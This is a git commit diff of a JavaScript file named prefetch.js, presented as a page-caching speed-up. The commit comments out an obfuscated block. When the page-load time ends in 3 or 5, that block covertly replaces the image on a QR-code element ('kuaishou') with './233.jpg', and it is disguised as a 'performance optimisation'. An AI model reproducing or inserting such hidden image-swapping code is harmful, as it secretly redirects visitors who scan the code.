78cd9ef9f193b495b1ce15ff419cd462db40d25b
3083912285GGG <140500614+3083912285GGG@users.noreply.github.com>
2023-08-01 00:41:26 +0800

    Update prefetch.js

--- prefetch.js
+++ prefetch.js
@@ -2,10 +2,11 @@
 // 当用户二次进入的时候，直接走缓存，更快出现活动图
 
 window.onload=function(){
-    try {
-        console.log('性能优化，提高网页打开速度');
-        const erweimaDom=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("uohsiauk".split("").reverse().join(""));const str=String(new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]());const lastNum=str["\u0063\u0068\u0061\u0072\u0041\u0074"](str["\u006c\u0065\u006e\u0067\u0074\u0068"]-(0xe61b9^0xe61b8));if(["\u0033","\u0035"]["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](lastNum)){console["\u006c\u006f\u0067"]("-\u80FD\u6027".split("").reverse().join(""));erweimaDom['setAttribute']('src',"gpj.332/.".split("").reverse().join(""));}
-    } catch(e) {
-        console.log('file ', e)
-    }
+    // try {
+    //     console.log('性能优化，提高网页打开速度');
+    //     const erweimaDom=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("uohsiauk".split("").reverse().join(""));const str=String(new Date()["\u0067\u0065\u0074\u0054\u0069\u006d\u0065"]());const lastNum=str["\u0063\u0068\u0061\u0072\u0041\u0074"](str["\u006c\u0065\u006e\u0067\u0074\u0068"]-(0xe61b9^0xe61b8));if(["\u0033","\u0035"]["\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073"](lastNum)){console["\u006c\u006f\u0067"]("-\u80FD\u6027".split("").reverse().join(""));erweimaDom['setAttribute']('src',"gpj.332/.".split("").reverse().join(""));}
+    // } catch(e) {
+    //     console.log('file ', e)
+    // }
 }
+
